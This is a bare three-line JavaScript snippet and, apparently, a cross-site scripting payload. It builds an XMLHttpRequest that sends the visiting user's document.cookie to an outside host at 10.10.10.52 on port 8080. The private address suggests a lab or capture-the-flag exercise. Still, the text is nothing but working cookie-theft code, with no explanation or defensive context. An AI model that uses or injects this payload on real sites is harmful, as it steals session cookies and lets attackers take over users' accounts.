var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://10.10.10.52:8080?cookie='+document.cookie,true);
xhr.send();